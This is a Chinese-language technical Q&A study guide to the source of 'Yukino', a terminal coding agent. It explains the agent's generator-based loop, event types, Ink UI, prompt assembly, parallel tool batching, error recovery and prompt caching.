---
title: "Yukino Code — 技术笔记"
---

> 本机器路径 `$HOME/github/yukino-code/apps/yukino`

> 本文档围绕 `apps/yukino` (一个运行在终端中的 Coding Agent, 类似 Claude Code) 的实现细节设计深度问答.
> 所有回答均基于真实源码 (`apps/yukino/src/`) , 回答中标注了关键文件与机制, 可作为系统学习材料.
> 全文共 104 组问答, 覆盖架构、循环、协议、工具、权限、TUI、上下文管理、会话与记忆、多智能体、工程化、运行模式、命令系统、基础设施、手写代码题、场景设计题、开放题与补充子系统.
> 注: 文中的文件路径与行号为撰写时点快照, 源码目录此后有过重构 (如 `src/tui/` 已并入 `src/ui/`、`src/agent/agent.ts` 现为 `src/agent/index.ts`) , 具体位置以函数/结构体名称为准.

## 一、项目整体架构与设计决策

### 请用几句话描述 Yukino 的整体架构, 并说明它与普通 CLI 工具的本质区别是什么?

Yukino 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 而在于它实现了一个 LLM 驱动的自治循环 (Agent Loop) : 普通 CLI 是"用户输入 → 程序执行 → 输出"的一次性映射, 而 Yukino 是"用户目标 → LLM 推理 → 调用工具 → 观察结果 → 再推理"的多轮闭环, 直到任务完成.

架构上分为六层:

1. 入口分发层 (`src/main.tsx`) : 根据 CLI 参数分发到四种模式 —— TUI (默认, Ink/React 交互界面) 、print (`-p` 管道模式, 支持 `text`/`stream-json` 输出) 、remote (Koa + WebSocket 的浏览器 UI) 、teammate (子进程后台代理) .
2. Agent 循环层 (`src/agent/index.ts`) : 核心是一个 `async *run(): AsyncGenerator<AgentEvent>` 生成器, 把"思考-行动"循环抽象为事件流.
3. LLM 抽象层 (`src/llm/`) : 统一 `LLMClient` 接口 (`stream()` + `setSystemPrompt()`) , 适配 anthropic / openai / openai-compat 三种协议.
4. 工具层 (`src/tools/`) : 统一 `Tool` 接口 (`schema()` + `execute()`) , 按 `category: read | write | command` 分类, 支撑并行调度与权限决策.
5. 表现层 (`src/ui/`) : Ink (React for CLI) 渲染, `app.tsx` (约 3000 行) 作为编排者消费 AgentEvent 流.
6. 横切支撑层: 权限 (`permissions/`) 、上下文压缩 (`compact/`) 、会话持久化 (`session/`) 、记忆 (`memory/`) 、钩子 (`hooks/`) 、MCP、技能、多智能体 (`subagent/`、`teams/`) .

关键设计洞察: 四种运行模式消费的是同一个 AgentEvent 流, Agent 核心对 UI 完全无感知 —— 这是"表现层与领域层彻底解耦"的体现.

---

### 为什么 Agent 循环要用 `AsyncGenerator` 而不是 EventEmitter 或回调? 这在架构上带来了什么好处?

这是一个关键的技术选型. `agent.run()` 的签名是 `AsyncGenerator<AgentEvent>`, 消费侧统一为 `for await (const event of agent.run())` (`tui/app.tsx:1542`) . 相比 EventEmitter/回调, AsyncGenerator 带来四个结构性优势:

1. 拉取式背压 (pull-based backpressure) : 消费方每次 `await` 下一个事件时才驱动 Agent 前进一步. TUI 渲染慢时, Agent 自然减速, 不存在 EventEmitter 推送模式下事件积压、需要额外缓冲队列的问题.
2. 控制流即代码: Agent 内部可以用普通的 `while` 循环 + `try/catch` 表达多轮推理、错误恢复、重试 (如限流后 `interruptibleSleep` 再 `continue`) , 逻辑线性可读. 用回调则会被迫拆成状态机.
3. 天然的中断语义: 调用方 `break` 或对底层 `AbortController` 触发 abort 即可终止生成器, 资源 (流式连接、睡眠定时器) 随生成器帧一并回收, 不需要手动 `removeAllListeners`.
4. 统一的消费接口: TUI (Ink React) 、print 模式 (stdout JSON) 、remote 模式 (WebSocket 转发) 三种宿主用完全相同的 `for await` 循环消费, 只是对事件做不同的渲染/序列化.

代价是: 生成器只能"推一条主线", 所以并行信息 (如子代理进度、团队邮箱消息) 通过回调 (`onProgress`、`notificationFn`) 旁路注入, 再被 Agent 循环在每轮开头 drain 成 system-reminder. 主线用生成器、旁路用回调, 是这个架构的分工.

---

### 项目中 AgentEvent 是如何建模的? 为什么用 discriminated union 而不是类继承?

`src/agent/events.ts` 定义了 12 个成员的判别联合 (discriminated union) :

| 事件                            | 载荷                                         | 语义                                 |
| ------------------------------- | -------------------------------------------- | ------------------------------------ |
| `stream_text` / `thinking_text` | `text`                                       | 正文/思考增量                        |
| `thinking_complete`             | `thinking, signature`                        | 思考块完成 (签名用于 Anthropic 回传) |
| `tool_use`                      | `toolName, toolId, args`                     | 工具调用开始                         |
| `tool_result`                   | `toolName, toolId, output, isError, elapsed` | 工具执行结果                         |
| `turn_complete`                 | —                                            | 一轮 (一次 LLM 响应+工具执行) 结束   |
| `loop_complete`                 | `stopReason`                                 | 整个 Agent 循环结束                  |
| `usage`                         | `UsageInfo`                                  | token 用量                           |
| `error`                         | `Error`                                      | 错误                                 |
| `compact`                       | `message, boundary?`                         | 发生了上下文压缩                     |
| `retry`                         | `reason, delay`                              | 自我恢复重试                         |
| `permission_request`            | `toolName, args`                             | 权限询问 (透传给 UI)                 |

选 discriminated union 而非类继承的原因:

1. 穷尽性检查 (exhaustiveness) : 消费侧的 `switch (event.type)` 配合 TypeScript 的 `never` 兜底, 新增事件类型时所有消费点都会在编译期报错, 不会漏处理 —— 这对"TUI、print、remote 三个消费端"的多宿主架构至关重要.
2. 零运行时开销: 事件是纯数据 (POJO) , print 模式的 `stream-json` 输出可直接 `JSON.stringify`, 不需要序列化器.
3. 函数式风格契合: 整个项目 (工具、权限、压缩) 都是"接口 + 纯数据"风格, 没有深类层次, 联合类型比继承更贴合.

---

### Yukino 的 TUI 选择了 Ink (React for CLI) 而不是 Blessed/Ratatui 这类方案, 你认为这个决策的权衡是什么? React 模型在终端里带来了什么独特能力?

Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 Yukino 恰恰是一个 UI 复杂度极高的终端程序 (流式文本、工具进度、权限对话框、计划审批、团队进度树、斜杠命令自动补全) . 权衡如下:

收益:

1. 声明式增量渲染: 流式输出本质是"状态随时间变化", React 的 state→view 映射天然契合. 对比 Blessed 的命令式 `box.setContent()`, React 模型下流式文本只是 `setStreamingText(text)`.
2. 组件复用与生态: `ink-spinner`、对话框组件、`<Static>`/`<Box>`/`<Text>` 布局原语可直接组合; 团队已有的 React 经验零迁移成本.
3. `<Static>` 组件解决终端特有痛点: 终端里已滚出屏幕的内容无法被重绘. Ink 的 `<Static>` 把"已提交消息"写入终端回滚缓冲区 (scrollback) 且永不重渲染, 与动态区 (流式内容) 分离 —— 这是 Yukino 消除闪烁的核心手段 (`app.tsx:1930` 附近) .
4. Hooks 管理复杂状态: `app.tsx` 用约 70 个 `useState`/`useRef` (28 个 useState + 43 个 useRef) 管理流式文本、权限请求、子代理进度、Ctrl+C 双击退出等状态, 逻辑内聚在函数组件中.

代价与应对:

1. 高频 setState 的渲染开销: LLM 每秒吐出数十个 token, 逐个触发 React 渲染会导致终端闪烁和 CPU 飙升. Yukino 用 50ms 节流 (`streamThrottleRef.current ??= setTimeout(...)`) 把 50ms 窗口内的所有 delta 合并为一次渲染.
2. Markdown 重解析的 O(n²) 风险: 流式文本每帧全量重解析 markdown 会越来越慢. Yukino 在 `StreamingText` 组件中实现"稳定前缀缓存"——按 `\n\n` 边界拆分, 已闭合段落只解析一次并缓存在 ref 中, 仅尾部不稳定段逐帧重解析.
3. 终端高度约束: 动态区超过终端行数会触发 Ink 清屏, `StreamingText` 做物理行截断 (预留 12 行给非聊天组件) .

结论: 选 Ink 是用"需要精细的性能工程"换取"声明式 UI 的开发效率", 对于一个交互密集的 Agent 终端是正确的权衡.

---

### 项目的系统提示词 (System Prompt) 是如何组织的? 这种"分段组装"的设计解决了什么问题?

`src/prompt/builder.ts` 实现了 PromptBuilder 模式: 系统提示词不是一个巨字符串, 而是一组带优先级的"段落 (Section) ", 按优先级排序后拼接 (`buildSystemPrompt()`, builder.ts:97-107, 共 8 个段落) :

| 优先级 | 段落             | 内容                                                             |
| ------ | ---------------- | ---------------------------------------------------------------- |
| 0      | Identity         | "You are Yukino..." 身份定义、安全禁令 (防命令注入/XSS/SQL 注入) |
| 10     | System           | 系统级行为准则                                                   |
| 20     | DoingTasks       | 任务执行规范                                                     |
| 30     | ExecutingActions | 危险操作确认策略                                                 |
| 40     | UsingTools       | 工具使用规范                                                     |
| 50     | ToneStyle        | 语气与风格                                                       |
| 60     | OutputEfficiency | 输出长度约束                                                     |
| 70     | Environment      | 运行时环境 (workDir、OS、shell、git 分支、模型、日期)            |

注意: 技能清单、项目指令 (YUKINO.md/AGENTS.md) 与长期记忆不再是系统提示词段落, 而是通过 `conversation.injectLongTermMemory()` (conversation.ts:133) 以 system-reminder 形式注入对话 —— 技能清单是项目级内容, 放进系统提示词会破坏跨项目的 prompt cache 前缀.

解决的问题:

1. 可组合性: 不同运行模式 (TUI / print / subagent) 可以裁剪不同段落组合, 例如子代理可注入 `systemPromptOverride` 完全替换.
2. 可测试性: 每个 section 是独立纯函数, 可单测.
3. 缓存友好: Anthropic 客户端在系统提示词上打 `cache_control: { type: "ephemeral" }` 断点 (`anthropic.ts:372`) , 系统提示词整体稳定不变才能命中 prompt cache —— 如果把易变内容 (如日期) 混在正文里会破坏缓存, 所以日期等信息放在靠后的 Environment 段, 且会话内不变.
4. 身份保护: Identity 段 (sections.ts:29-39) 只定义 "You are Yukino..." 身份与安全禁令, 并不含"不得提及 Claude/Anthropic/OpenAI"的约束 —— 该约束仅出现在 remote 模式初始化时注入的 "IDENTITY OVERRIDE" system-reminder (server.ts:419, 见「IDENTITY OVERRIDE 与系统提示词 Identity 段的关系」) , 是按宿主定制的运行时强化而非系统提示词内容.

---

### Yukino 的四种运行模式 (TUI / print / remote / teammate) 如何复用同一套核心逻辑? 这种设计对可测试性有什么意义?

复用的关键是 Agent 核心只依赖注入的接口, 不依赖宿主环境:

```
main.tsx ──┬── TUI      → Ink <App>, 消费 AgentEvent → React state
           ├── print    → parsePrintFlags → 消费 AgentEvent → stdout (text/stream-json)
           ├── remote   → Koa + WebSocket, 消费 AgentEvent → 广播给浏览器 React 前端
           └── teammate → 子进程, 消费 AgentEvent → 写文件邮箱/进度文件
```

四个宿主共享: `Agent` (循环) 、`ConversationManager` (消息历史) 、`ToolRegistry` (工具) 、`PermissionChecker` (权限) 、`compact` (压缩) 、`session` (持久化) . 宿主只负责三件事: 构造依赖 (依赖注入) 、消费事件流、处理人机交互 (权限确认、提问) .

对可测试性的意义:

1. Agent 核心可无头测试: 测试里直接 `for await (const e of agent.run())`, 注入 mock `LLMClient` (返回预置 StreamEvent 序列) 即可驱动完整循环, 不需要终端. `tests/agent.test.ts` 正是这样做的.
2. print 模式即 E2E 测试载体: `tests/run-e2e.mjs` 用 `yukino -p "..."` 非交互模式跑真实端到端场景, 因为 print 与 TUI 共享同一核心, print 通过即核心逻辑通过.
3. 权限等交互可注入: `onPermissionRequest` 是一个返回 `Promise<PermissionAction>` 的回调, 测试中可以注入"总是允许", TUI 中注入"弹对话框" —— 同一套代码路径, 不同的交互策略.

---

## 二、Agent 核心循环与异步迭代

### 请完整描述 Agent 循环 `run()` 的单轮迭代流程.

`src/agent/agent.ts` 的 `run()` 是一个 `while (looping)` 循环 (起于 line 174, 循环体在 line 189) , 单轮迭代按严格顺序执行:

1. 最大迭代守卫: `maxIterations > 0 && iteration > maxIterations` 时 yield error 并返回, 防止失控死循环 (默认 `maxIterations = 0` 即不限制, 200 是 spawnSubagent 的默认值) .
2. 计划模式提醒: 若权限模式为 `plan`, 注入 system-reminder —— 第 1 轮和每第 5 轮用完整版, 其余轮用一行精简版 (`plan-mode.ts`, `reminderInterval = 5`) , 在"持续约束模型行为"与"节省 token"之间折中.
3. 排空旁路通知: 把两类异步消息 drain 成 system-reminder 注入对话 —— Hook 引擎排队的通知 (`hookEngine.drainNotifications()`) 和团队邮箱消息 (`notificationFn()`) .
4. 生命周期钩子: 依次 fire `turn_start`、`pre_send`.
5. Layer 1 — 自动压缩: `manageContext()` 估算 token, 超过自动阈值则执行压缩, 压缩后重新注入长期记忆. 注意此处不做预算修剪 —— 工具结果在入历史时已完成预算处理 (agent.ts 注释 "Tool results are already budget-processed at the time they enter history") , transcript 里的消息尺寸是终态, 直接从它们估算 token 即可.
6. 调用 LLM 流式接口: `client.stream()` 返回 AsyncGenerator`<StreamEvent>`, Agent 把内部事件映射为 AgentEvent 转发给消费方 (`text_delta→stream_text`、`thinking_delta→thinking_text`、`tool_call_complete→tool_use` 等) , 同时累积 `fullText`、`thinkingBlocks`、`toolUses`、`stopReason`.
7. 错误自愈 (见「Agent 循环的自愈机制」) : `ContextTooLongError` → 强制压缩重试; `RateLimitError` → 按 Retry-After 等待重试.
8. post_receive 钩子.
9. assistant 消息落历史: `addAssistantFull(fullText, thinkingBlocks, toolUses)`.
10. 分支:
    - 有工具调用 → `executeTools()` (分批+权限+钩子) ; 结果入历史前做预算处理: 先对单条超 `MAX_OUTPUT_CHARS = 50000` 字符的结果调 `persistLargeResult()` 落盘, 替换为 2KB 预览+路径, 再调 `applyBudget()` 管聚合 —— 一条消息内全部结果字符总数超 `MESSAGE_AGGREGATE_LIMIT = 200000` 时从最大者起逐个落盘直到达标 (读回落盘文件的结果与本轮已落盘者经 exemptIds 豁免) ; 然后落历史, fire `turn_end`, 进入下一轮;
    - 无工具调用 → `looping = false`, 文件历史快照, yield `loop_complete`, fire `session_end`, 循环结束.

值得强调的是位置设计: 预算处理发生在"工具结果入历史时"而不是"每轮调 LLM 前" —— 处理完成消息即为终态, 此后永不修改, Prompt Cache 前缀天然稳定, token 估算也可直接按 transcript 尺寸计算. 压缩则是窗口将满才触发的"有损"兜底, 与"先无损落盘、后摘要压缩"的两级降级思想一致: 显式的大结果先落盘 (廉价、无损, 原文可 ReadFile 回读) , 仍不够才动用丢失细节的摘要.

---

### 工具调用的"分批并行"是如何实现的? 为什么 read 类工具可以并行而 write/command 不行?

实现分两层:

分批算法 (`agent.ts:650` `partitionToolCalls()`) :

```ts
for (const tu of toolUses) {
  const tool = this.registry.get(tu.toolName);
  const safe = (tool?.category ?? "command") === "read";
  if (safe && batches.length > 0 && batches.at(-1)!.concurrent) {
    batches.at(-1)!.blocks.push(tu); // 合并进当前并行批
  } else {
    batches.push({ concurrent: safe, blocks: [tu] }); // 开新批
  }
}
```

规则: 连续的 `category === "read"` 工具合并为一个并行批; 任何 write/command 工具单独成批 (串行) . 例如模型一轮输出 `[Read, Read, Grep, Edit, Read, Bash]`, 会被分为 `[Read,Read,Grep] | [Edit] | [Read] | [Bash]` 四批.

执行引擎 (`streaming-executor.ts`) : `StreamingExecutor` 是 submit/collect 模式 —— 并行批先全部 `submit()` 再一次 `collectResults()` (内部 `Promise.all`) ; 串行批每 `submit()` 一个立即 `collectResults()`, 退化为逐个执行.

为什么 read 可以并行:

1. 无副作用: 读文件、glob、grep 不改变系统状态, 并发执行结果与顺序无关 (可交换性) .
2. 写操作必须保序: Edit/Write/Bash 可能相互依赖 (先写文件 A 再 grep A) , 且模型生成工具调用的顺序本身隐含了因果序, 打乱会破坏语义.
3. 未知工具保守降级: `(tool?.category ?? "command")` —— 注册表查不到的工具按 command 处理, 串行执行, 宁可慢也不冒险.

这个设计的本质: 用工具元数据 (category) 把"模型的扁平输出"还原成"有偏序关系的执行计划", 在不引入复杂 DAG 调度的前提下拿到了读操作的并行收益.

---

### Agent 循环有哪些"自愈"机制? 请分别说明触发条件与恢复策略.

Yukino 有三类自愈机制, 都在 `agent.ts` 中:

1. 上下文超长 (ContextTooLongError) → 强制压缩重试

- 触发: LLM API 返回 413 或消息匹配 `/prompts?\s+too\s+long/i` (OpenAI 侧还检查 400 + `context_length_exceeded`) .
- 策略: `forceCompact()` → 清除 usage anchor → 重新注入长期记忆 → yield `compact` 事件 → `continue` 重试本轮. 若压缩本身失败才向上抛错.

2. 限流 (RateLimitError) → 退避重试

- 触发: HTTP 429.
- 策略: 解析 `Retry-After` 头 (默认 5000ms) , yield `retry` 事件通知 UI, 然后 `interruptibleSleep(waitMs)` —— 睡眠期间若用户按 Ctrl+C 触发 abort, 则优雅退出 (yield `loop_complete: "interrupted"`) 而不是粗暴中断.

3. max_tokens 截断 → 输出上限升级 + 多轮续写

- Phase 1 (升级) : 首次 `stop_reason === "max_tokens"` 时, 把输出上限提升到 `MAX_TOKENS_CEILING = 64000`, 把已生成的部分文本作为 assistant 消息落历史, 追加用户消息"从断点直接继续", 立即重试.
- Phase 2 (多轮恢复) : 若升级后仍截断, 最多再做 `MAX_OUTPUT_TOKENS_RECOVERIES = 3` 轮续写, 提示词改为"把剩余工作拆成更小的块". 任何非 max_tokens 的停止原因都会重置计数器.

三类都是资源/瞬态问题, 用"修正上下文后重试"恢复. 另一类相关机制是未知工具的处理 (`streaming-executor.ts:65-76`) : 模型幻觉出不存在的工具名时, 执行器不做任何计数或熔断, 只是返回一条 `Error: unknown tool 'xxx'` 错误结果 (源码注释写明 "let the model self-correct with another tool; keep the loop running") , 让模型看到错误后自行纠正 —— 循环照常继续.

设计哲学: 可恢复故障优先"修正上下文后重试"而不是直接失败. 所有恢复路径都通过 yield 事件让 UI 可见 (用户能看到"retrying..."、"compacting...") , 不是静默魔法.

---

### `turn_complete` 与 `loop_complete` 两个事件的边界语义是什么? UI 如何利用这个边界?

- turn (轮) : 一次 LLM 响应 + 其引发的全部工具执行. 一个用户提问通常包含多个 turn (模型调工具 → 看结果 → 再调工具) .
- loop (循环) : 从用户提问到 Agent 彻底完成 (模型不再调用工具) 的整个过程.

`turn_complete` 在每一轮结束时发出, `loop_complete` 只在循环退出时发出一次. UI 对两者的利用完全不同 (`app.tsx` 事件循环) :

`turn_complete` 时 (`app.tsx:1646`) :

1. 冲刷 (flush) 50ms 节流定时器, 确保流式文本最终态渲染出来;
2. 清空 `streamingText`, 把本轮积累的 thinking + 工具调用折叠为 `turn_summary` 消息, 流式文本保留为 `assistant` 消息, 一并 push 进消息列表;
3. 新消息进入 `<Static>` 的 items 数组后, Ink 自动将其渲染到终端回滚缓冲 (永不重绘) .

`loop_complete` 时 (`app.tsx:1686`) :

1. 同样冲刷节流、提交消息 (这次是 assistant 正文) ;
2. 若处于 plan 模式 → 弹出计划审批对话框.

值得说明的是职责归属: 会话持久化 (写 JSONL) 与文件历史快照 (供 `/rewind` 回滚) 并不在 UI 的事件处理器里, 而是由 Agent 核心完成 —— `persistLastMessage()` (agent.ts:814) 在每条消息进入对话历史时即追加落盘, `fileHistory.makeSnapshot()` (agent.ts:578) 在循环正常退出时记录快照. UI 只负责渲染收尾与交互.

这个双层边界的价值: turn 是"渲染提交单元", loop 是"交互单元". 把 thinking/工具调用折叠成 turn_summary 再进 Static 区, 显著减少了 Static 项数量和终端回滚区的渲染压力 —— 用户看到的是简洁的"思考了 3s · 用了 5 个工具"摘要, 而不是刷屏的中间过程.

---

### Agent 循环里为什么要维护 `streamingTextRef` 这样的"可变 ref 镜像"? 直接用 state 会有什么问题?

这是 React 异步回调中的经典陈旧闭包 (stale closure) 问题. Agent 事件循环是一个长生命周期的 `for await` 循环 (`app.tsx:1542`) , 它持有的回调闭包捕获的是循环开始时的 state 快照. 以流式文本为例:

```ts
case "stream_text":
  fullText += event.text;                    // 局部变量, 可靠
  streamingTextRef.current = fullText;       // ref 镜像, 可靠
  streamThrottleRef.current ??= setTimeout(() => {
    setStreamingText(streamingTextRef.current);  // ← 必须读 ref
    streamThrottleRef.current = null;
  }, 50);
```

如果 `setTimeout` 回调里直接读 `fullText` 或 `streamingText` (state) : `fullText` 恰好是事件循环本次迭代的局部变量, 但节流回调是在 50ms 后异步执行的, 其间可能又到达了多个 `stream_text` 事件 —— 回调读到的是旧值, 最后一小段文本会丢帧. 用 `streamingTextRef.current` (可变对象的 current 属性) 则永远读到最新值.

同理 `permModeRef`: 权限检查、plan 模式判断发生在异步回调深处 (如 `loop_complete` 处理、ExitPlanMode 工具的 `isPlanMode` 回调) , 这些回调注册时捕获的 `permMode` state 早已过期, 必须用 ref 镜像穿透闭包.

经验法则: 事件源 (Agent 循环、定时器、工具回调) 驱动的异步代码里, "读最新值"用 ref, "驱动渲染"用 state —— Yukino 的模式是写时双写 (state + ref) , 渲染读 state, 异步逻辑读 ref.

---

### 权限确认是一个"需要等待用户输入"的交互, 而 Agent 循环是一个生成器 —— 二者如何协作? 请解释 Promise 悬挂模式.

Yukino 用 Promise-based suspension (Promise 悬挂) 把"同步阻塞等待用户"桥接进异步生成器:

1. Agent 构造时注入回调 `onPermissionRequest: (toolName, args, decision) => Promise<"allow" | "deny" | "allowAlways">`(`agent.ts:101-105`) .
2. 权限检查判定需要询问时, Agent `await onPermissionRequest(...)` —— 生成器在这一帧挂起.
3. TUI 侧的注入实现: 把 `resolve` 函数存入 `permissionResolveRef`, 同时 `setPermissionRequest({...})` 触发 React 渲染 `PermissionDialog`.
4. 用户在对话框按键选择 (Yes / Yes, don't ask again / No) , `onComplete` 调用 `permissionResolveRef.current?.(action)`.
5. Promise 兑现 → Agent 的 `await` 恢复, 拿到决策继续执行 (allow 则执行工具, deny 则返回拒绝结果给模型) .

这个模式的精妙之处:

- Agent 核心完全不知道 UI 的存在: 它只知道"await 一个决策", TUI、测试 (直接 resolve "allow") 、remote (通过 WebSocket 等浏览器响应) 可以注入完全不同的交互实现.
- 生成器挂起即"免费"的协程暂停: 不需要把 Agent 拆成状态机, 也不需要轮询.
- 天然的取消语义: 用户按 Ctrl+C 时 abort signal 触发, 挂起的 Promise 可被 reject, 生成器帧清理.

同样的模式复用在 `AskUserQuestionTool` (注入 `Asker` 函数) 和计划审批上 —— 所有 HITL 交互统一为"依赖注入的 Promise 工厂", 这是 Yukino 最值得借鉴的交互架构之一.

---

### Agent 如何防止"工具调用死循环" (模型反复调用工具永不停止) ?

多层防线:

1. maxIterations 硬上限: `Agent` 构造参数 `maxIterations` (默认 `0` 即不限制; 子代理 `spawnSubagent` 默认传 200) , 超过即 yield error 终止. 这是最基础的保险丝.
2. 未知工具错误回灌: 模型幻觉出不存在的工具时, 执行器返回 `Error: unknown tool 'xxx'` 错误结果并继续循环 (不做计数或熔断) , 把纠错交给模型自己 (见「Agent 循环的自愈机制」) .
3. 压缩熔断器: `MAX_CONSECUTIVE_FAILURES = 3` —— 自动压缩连续失败 3 次后跳过自动压缩 (除非达到硬阻塞阈值强制压缩) , 避免"压缩失败 → 上下文仍超长 → 再压缩"的抖动循环.
4. 工具结果回灌机制: 模型调错工具时, 错误信息 (如 `Error: unknown tool 'xxx'`) 作为 tool_result 回喂给模型, 模型通常会在下一轮自我纠正 —— 大多数"潜在死循环"在一两轮内就被模型自己化解, 硬上限只是兜底.
5. 成本控制视角: 每轮都有 `usage` 事件流出, 状态栏实时显示 token 消耗, 用户可以 Ctrl+C 中断 (`interruptibleSleep` 和 abort signal 贯穿全链路) .

工程启示: 对自治 Agent, "让模型看到错误自我纠正"是第一道防线 (软) , 迭代计数与熔断是最后防线 (硬) , 软硬结合, 且硬防线必须独立于模型行为 (不能指望模型自己停下来) .

---

## 三、LLM 抽象层与流式协议

### `LLMClient` 接口是如何设计的? 三套协议 (anthropic / openai / openai-compat) 的差异被如何收敛?

接口极简化 (`llm/client.ts`) :

```ts
interface LLMClient {
  stream(messages, tools, ...): AsyncGenerator<StreamEvent>;
  setSystemPrompt(prompt: string): void;
  // + setMaxOutputTokens 等少量调节方法
}
```

工厂函数 `createClient(config)` 按 `config.protocol` 分发到 `AnthropicClient` / `OpenAIClient` / `OpenAICompatClient`. 差异收敛的策略是"统一输出事件流, 差异留在消息构造与事件解析两侧":

| 差异点         | Anthropic                                                                       | OpenAI Responses                                                            | OpenAI Chat Completions                                                             |
| -------------- | ------------------------------------------------------------------------------- | --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| 消息构造       | `buildAnthropicMessages()`: thinking 块、tool_use/tool_result 块、user 交替合并 | `buildOpenAIInput()`: reasoning 项、function_call/function_call_output 项   | `buildChatCompletionMessages()`: assistant 的 `tool_calls` 数组、`role:"tool"` 消息 |
| 思考内容       | `thinking` 块 + `signature` 签名 (需原样回传)                                   | reasoning item 的 `summary`                                                 | 非标准 `delta.reasoning_content` 字段                                               |
| 工具增量       | `input_json_delta` 累积 JSON                                                    | function_call arguments 增量                                                | 按 `tc.index` 的 Map 累积, `finish_reason` 时一次性发出                             |
| 停止原因       | `stop_reason` 字符串                                                            | `status:"incomplete"` + `incomplete_details.reason`                         | `finish_reason` (`length→max_tokens`)                                               |
| 缓存统计       | `cache_read`/`cache_creation`                                                   | `cached_tokens`, 且需从 input_tokens 中去重 (`Math.max(0, input - cached)`) | 同 Responses                                                                        |
| 上下文超长信号 | 413 或 "prompt too long"                                                        | 400 + `context_length_exceeded`                                             | 同左                                                                                |

收敛点: 三家最终都吐出同一个 `StreamEvent` 联合 (`text_delta`、`thinking_delta`、`thinking_complete`、`tool_call_start/delta/complete`、`stream_end{stopReason, usage}`) . 上层 Agent 对协议零感知 —— 这是典型的防腐层 (Anti-Corruption Layer) 模式, 把第三方 API 的方言翻译为内部统一语言.

一个细节: Chat Completions 的工具调用是"流式碎片" (同一个调用的 id、name、arguments 分多个 chunk 到达, 按 `index` 归属) , 客户端用 `Map<number, {id, name, args}>` 累积, 直到 `finish_reason` 才发出 `tool_call_complete` —— 碎片重组逻辑被完全封装在客户端内.

---

### Prompt Caching 是如何实现的? 三个缓存断点分别放在哪里、为什么?

Anthropic 的 prompt caching 按前缀匹配计费优化 —— 从消息开头到 `cache_control` 断点处的内容若与上次请求一致, 则命中缓存 (cache read 价格约为原价的 1/10) . Yukino 在 `anthropic.ts` 设了三个断点, 位置选择体现"稳定性递减"原则:

1. 系统提示词 (anthropic.ts:372) : 整个 system prompt 打 `cache_control: { type: "ephemeral" }`. 系统提示词在一个会话内不变, 是最稳定的前缀.
2. 最后一个非 deferred 工具 schema (`markToolsForCache()`, anthropic.ts:68-77) : 从后往前找到最后一个未标记 `defer_loading` 的工具打上缓存标记, 使整个工具块命中缓存. 工具集只在"发现延迟工具"时变化, 相对稳定; 且工具 schema 体积大 (描述文本长) , 缓存收益最高. 之所以要跳过 deferred 工具, 是因为"同时携带 defer_loading 与 cache_control"会被 API 拒绝.
3. 最后一条 user 消息尾部 (`markLastUserTailForCache()`, anthropic.ts:561) : 从后往前找到最后一条非空 user 消息, 在其最后一个内容块上打断点 (通过 `Reflect.set` 动态附加, 且优先选非 image 块 —— 某些网关拒绝在 image 块上打断点) . 这利用了会话的增量特性 —— 每轮请求都是"上一轮全部内容 + 新增尾部", 在最新尾部前打断点, 使得整段历史前缀都可命中缓存, 只有新增的增量部分按全价计费.

效果: 多轮对话中, 第 N 轮的输入 token 大部分以 cache read 计价, 成本和首 token 延迟 (TTFT) 都显著下降. `UsageInfo` 里专门有 `cacheReadInputTokens` / `cacheCreationInputTokens` 字段来观测缓存命中率.

注意与压缩的联动: 压缩会重写历史 (摘要+保留尾部) , 等于"换前缀", 下一轮必然缓存未命中并重新创建缓存 —— 这是压缩的隐性成本, 所以压缩阈值不能设得太激进.

---

### `buildAnthropicMessages()` 中"user 消息合并"是什么机制? 解决什么问题?

Anthropic API 要求消息严格 user/assistant 交替 —— 连续两条同角色消息会被拒绝. 但 Yukino 内部有多种场景会产生连续 user 消息:

- 压缩重建后: 摘要以 user 消息形式放在开头, 若保留尾部的第一条也是 user, 则连续;
- `addSystemReminder()`: system-reminder 以 `role: "user"` 落历史 (Anthropic 协议无独立 system 角色消息位, system 只能是顶层参数) ;
- 团队邮箱通知、Hook 通知注入.

`buildAnthropicMessages()` (`anthropic.ts:177`) 的合并规则: 若当前 user 文本消息的前一条也是 user 文本消息 (且非 tool_result) , 则把当前内容作为额外 text 块合并进前一条. tool_result 块消息独立处理 (它们是协议允许的 user 角色内容块) .

这个"内部模型宽松、出站转换严格"的分层很典型: 内部 `ConversationManager` 允许任意追加 (简单、不易错) , 协议合规性在序列化边界一次性保证. 对比"每次插入都检查前驱"的方案, 序列化时归一化只需处理一次且逻辑集中, 不容易在多个注入点漏处理.

---

### LLM 层的错误分类体系是怎样的? 为什么要把错误分类做得这么细?

`llm/errors.ts` 定义了继承体系:

```
LLMError
├── AuthenticationError   (401)
├── RateLimitError        (429, 携带 retryAfter)
├── NetworkError          (非 API 错误: DNS/连接重置等)
└── ContextTooLongError   (413 / prompt too long / context_length_exceeded)
```

分类由协议专属的 `classifyAnthropicError()` / `classifyOpenAIError()` 完成, 依据状态码 + 错误消息正则 (如 OpenAI 的上下文超长常以 400 返回, 需匹配 `context_length_exceeded` / `maximum context length`) .

分类细的原因: Agent 循环的恢复策略是按错误类型分派的 ——

- `ContextTooLongError` → 压缩上下文后重试 (可恢复) ;
- `RateLimitError` → 按 `retryAfter` 退避后重试 (可恢复, 且需要解析 Retry-After 头, 所以该错误类额外携带数据) ;
- `AuthenticationError` → 直接上抛给用户 (重试无意义) ;
- `NetworkError` → 上抛 (当前实现不做自动重试, 避免放大故障) .

这是"用类型系统编码恢复语义"的实践: catch 块用 `instanceof` 分派, 而不是解析错误消息字符串. 新增恢复策略时只需新增错误子类 + 一个分支, 符合开闭原则. 同时分类发生在防腐层内部, 上层面对的永远是统一错误体系, 与底层协议无关.

---

### `UsageAnchor` (用量锚点) 机制是如何工作的? 它解决了 token 估算的什么痛点?

痛点: 上下文压缩需要知道"当前对话占多少 token", 但本地无法精确计算 (不同模型的 tokenizer 不同) . 纯字符估算 (`chars / 3.5`) 误差大 —— 中文、代码、base64 的字符/token 比差异悬殊, 误差累积会导致"过早压缩 (浪费) "或"过晚压缩 (爆上下文) ".

UsageAnchor 的解法 (`conversation.ts:203`) : 用 API 返回的真实用量校准.

```ts
recordUsageAnchor(input, output, cacheRead, cacheCreation) {
  this.baselineTokens = input + cacheRead + cacheCreation + output;
  this._anchorCount = this.history.length;   // 锚点时刻的消息数
}
```

